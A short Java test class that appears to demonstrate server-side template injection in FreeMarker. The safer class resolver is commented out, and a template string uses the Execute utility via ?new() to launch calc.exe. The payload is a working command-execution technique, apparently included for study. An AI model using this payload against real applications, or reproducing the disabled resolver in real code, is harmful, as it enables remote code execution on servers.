package com.freemarker;

import freemarker.core.TemplateClassResolver;
import freemarker.template.Configuration;
import freemarker.template.Template;
import freemarker.template.TemplateException;

import java.io.IOException;
import java.io.StringWriter;
import java.util.HashMap;

public class freemarkerTest {
    public static void main(String args[]) throws IOException, TemplateException {
        Configuration configuration = new Configuration();
//        configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
        String templateContent = "<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"calc.exe\")}";
        Template tpl = new Template(null, templateContent, configuration);
        StringWriter writer = new StringWriter();
        tpl.process(null, writer);
        System.out.println(writer);
    }
}
